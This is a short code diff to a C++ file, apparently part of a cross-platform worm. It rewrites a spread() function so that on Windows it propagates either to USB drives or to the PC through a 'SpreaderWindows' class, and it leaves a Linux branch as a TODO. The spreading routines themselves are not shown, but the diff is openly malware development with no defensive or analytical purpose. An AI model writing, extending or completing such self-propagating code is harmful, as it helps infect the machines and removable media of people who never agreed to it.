@@ -1,13 +1,16 @@
 #include <cosmo.h>
-#include <cstdio>
 #include <libc/dce.h>
-#include "find-drives-windows.h"
+#include "spreader-windows.h"
 
 void spread() {
-  printf("spread init\n");
   if (IsWindows()) {
-    getUsbDrives();
-  } else {
-
+    SpreaderWindows s;
+    if (s.shouldSpreadToUsb()) {
+      s.spreadToUsb();
+    } else {
+      s.spreadToPc();
+    }
+  } else if (IsLinux()) {
+    // TODO
   }
 }
